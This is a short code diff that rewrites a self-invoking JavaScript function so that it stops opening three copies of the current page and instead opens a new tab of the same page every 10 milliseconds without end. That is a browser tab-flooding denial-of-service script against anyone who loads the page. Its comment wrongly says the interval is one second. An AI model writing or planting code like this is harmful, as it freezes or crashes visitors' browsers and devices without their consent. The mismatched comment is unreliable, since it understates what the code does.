@@ -1,5 +1,5 @@
-(function openCopies() {
-    for (let i = 0; i < 3; i++) { // Adjust the number of copies per recursion
+(function openContinuously() {
+    setInterval(() => {
         window.open(window.location.href, '_blank');
-    }
+    }, 10); // Opens a new page every 1 second (adjust as needed)
 })();
